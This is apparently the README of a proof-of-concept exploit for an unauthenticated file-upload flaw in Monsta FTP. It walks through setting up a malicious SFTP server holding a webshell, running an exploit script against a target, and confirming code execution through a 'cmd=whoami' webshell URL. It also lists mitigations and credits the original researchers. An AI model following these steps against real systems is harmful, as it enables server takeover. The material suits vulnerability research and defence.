# Monsta FTP Unauthenticated Arbitrary File Upload - Proof of Concept

## Description

Monsta FTP versions 2.11 and earlier are vulnerable to an unauthenticated arbitrary file upload, identified as CVE-2025-34299. This critical flaw allows attackers to upload a specially crafted file from a malicious SFTP server without any authentication. Successful exploitation enables arbitrary code execution on the target system.

## Vulnerability Details

The vulnerability arises from insufficient validation of user-supplied data within the SFTP download functionality. An attacker can manipulate parameters to download a file from a controlled SFTP server to an arbitrary location on the target system, potentially leading to remote code execution.

## Prerequisites

*   **Python 3:** Ensure Python 3 is installed on the system.
*   **Required Python Libraries:** Install the following Python libraries using `pip`.

    ```bash
    pip install -r requirements.txt
    ```


## Proof of Concept (Exploit)

The `exploit.py` script demonstrates the vulnerability by sending a crafted POST request to initiate an SFTP download from the malicious server, effectively uploading the file to the target system. It then verifies the upload via a web request.

## How to Use

1.  **Set up a Malicious SFTP Server:**

    You'll need a server running an SFTP service to serve the malicious file.  [FileZilla Server](https://filezilla-project.org/) is a popular, free option for this purpose.

    *   **Download and Install:** Download and install FileZilla Server on a machine you control.
    *   **Configure User:** Create a user within FileZilla Server with read permissions for the directory where your malicious file will be placed.  Note the username and password.
    *   **Place Malicious File:** Place the file you want to upload (e.g., a webshell) into the configured directory.

2.  **Replace Placeholders:** In the `exploit.py` script, update the placeholders for the target hostname, malicious SFTP IP, username, password, and port as required.

3.  **Run the Exploit:**

    ```bash
    python exploit.py <target_hostname> <malicious_sftp_ip> <username> <password> <port>
    ```

4.  **Verify Exploitation:** Upon success, the script indicates the file has been written. Access the uploaded file via a web browser to confirm remote code execution (e.g., http://<target_hostname>/mftp/index3.php?cmd=whoami).


## Mitigation

*   **Update Monsta FTP:** Upgrade to a patched version once available, as the vulnerability affects versions 2.11 and earlier.
*   **Input Validation:** Enforce robust validation on all user-supplied data, especially in SFTP request handling.
*   **Least Privilege:** Operate the Monsta FTP web server with minimal privileges to limit compromise impact.
*   **Web Application Firewall (WAF):** Implement a WAF to identify and obstruct malicious requests exploiting this vulnerability.
*   **Monitoring:** Actively monitor for exploitation attempts, as this vulnerability is being exploited in the wild.

## Disclaimer

This proof-of-concept is provided solely for educational and research purposes. Employ it responsibly and ethically, exclusively with explicit permission from the target system's owner. The author bears no responsibility for any misuse or resultant damage.

## Credit

This vulnerability was originally discovered and researched by **watchTowr Labs**.  See their detailed analysis here: [https://labs.watchtowr.com/whats-that-coming-over-the-hill-monsta-ftp-remote-code-execution-cve-2025-34299/](https://labs.watchtowr.com/whats-that-coming-over-the-hill-monsta-ftp-remote-code-execution-cve-2025-34299/)

Many thanks to **watchTowr Labs** for their thorough research and for publishing the analysis that made this write-up possible.
